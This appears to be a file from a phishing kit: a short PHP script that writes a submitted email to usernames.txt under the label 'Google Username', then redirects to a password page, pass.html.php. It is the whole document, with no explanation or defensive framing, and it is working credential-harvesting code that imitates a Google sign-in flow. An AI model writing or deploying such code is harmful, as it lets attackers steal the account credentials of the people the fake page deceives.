<?php
file_put_contents("usernames.txt", "Google Username: " . $_POST['email'] . "\n", FILE_APPEND);
header('Location: pass.html.php');
exit();
?>